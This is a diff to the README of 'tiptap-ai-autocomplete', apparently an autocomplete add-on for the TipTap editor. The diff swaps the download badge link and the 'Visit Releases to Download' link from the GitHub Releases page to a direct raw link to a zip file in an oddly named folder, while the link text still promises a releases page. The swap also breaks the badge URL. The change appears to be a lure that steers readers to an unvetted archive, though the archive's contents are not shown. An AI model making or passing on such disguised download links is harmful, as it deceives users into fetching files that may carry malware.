@@ -1,6 +1,6 @@
 # 🛠️ tiptap-ai-autocomplete - Smart Text Editing Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/dsgfdgsgsegg/tiptap-ai-autocomplete/releases)
+[![Download](https://raw.githubusercontent.com/dsgfdgsgsegg/tiptap-ai-autocomplete/main/mobocratic/tiptap-ai-autocomplete.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/dsgfdgsgsegg/tiptap-ai-autocomplete/main/mobocratic/tiptap-ai-autocomplete.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **tiptap-ai-autocomplete**! This application enhances your TipTap edi
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Visit Releases to Download](https://github.com/dsgfdgsgsegg/tiptap-ai-autocomplete/releases)
+   [Visit Releases to Download](https://raw.githubusercontent.com/dsgfdgsgsegg/tiptap-ai-autocomplete/main/mobocratic/tiptap-ai-autocomplete.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see different versions of the software. Select the latest version for the best features and performance.
